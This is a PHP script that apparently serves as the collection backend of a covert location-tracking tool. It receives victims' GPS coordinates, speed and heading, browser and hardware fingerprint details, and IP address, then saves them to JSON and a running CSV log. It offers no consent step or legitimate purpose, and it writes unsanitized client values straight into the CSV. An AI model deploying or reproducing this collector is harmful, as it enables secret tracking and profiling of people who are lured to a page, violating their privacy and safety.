<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit(0);
}

// obtener IP 
function getUserIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        return $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        return $forward;
    } else {
        return $remote;
    }
}

// Crear directorio de logs (crear primero si no)
$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}

// Obtener datos
$input = file_get_contents('php://input');
$postData = [];
parse_str($input, $postData);

// Si no hay datos POST, intentar GET
if (empty($postData)) {
    $postData = $_GET;
}

$data = [
    'timestamp' => date('Y-m-d H:i:s'),
    'ip' => getUserIP(),
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
    'location' => [
        'lat' => $postData['Lat'] ?? null,
        'lon' => $postData['Lon'] ?? null,
        'acc' => $postData['Acc'] ?? null,
        'alt' => $postData['Alt'] ?? null,
        'dir' => $postData['Dir'] ?? null,
        'spd' => $postData['Spd'] ?? null
    ],
    'device' => [
        'platform' => $postData['Ptf'] ?? null,
        'browser' => $postData['Brw'] ?? null,
        'cores' => $postData['Cc'] ?? null,
        'ram' => $postData['Ram'] ?? null,
        'vendor' => $postData['Ven'] ?? null,
        'render' => $postData['Ren'] ?? null,
        'width' => $postData['Wd'] ?? null,
        'height' => $postData['Ht'] ?? null,
        'os' => $postData['Os'] ?? null,
        'language' => $postData['Lang'] ?? null,
        'timezone' => $postData['Tz'] ?? null
    ],
    'status' => $postData['Status'] ?? 'unknown',
    'error' => $postData['Error'] ?? null
];

// save archivo JSON
$jsonData = json_encode($data, JSON_PRETTY_PRINT);
file_put_contents($logDir . '/data.json', $jsonData);

// igual csv
$csvFile = $logDir . '/history.csv';
if (!file_exists($csvFile)) {
    file_put_contents($csvFile, "timestamp,ip,lat,lon,accuracy,browser,platform,os,status,error\n");
}

$csvLine = sprintf(
    "%s,%s,%s,%s,%s,%s,%s,%s,%s,%s\n",
    $data['timestamp'],
    $data['ip'],
    $data['location']['lat'] ?? 'NULL',
    $data['location']['lon'] ?? 'NULL',
    $data['location']['acc'] ?? 'NULL',
    $data['device']['browser'] ?? 'NULL',
    $data['device']['platform'] ?? 'NULL',
    $data['device']['os'] ?? 'NULL',
    $data['status'],
    $data['error'] ?? 'NULL'
);
file_put_contents($csvFile, $csvLine, FILE_APPEND);

// confirmacion xd
echo json_encode(['status' => 'success', 'message' => 'Data saved']);
?>
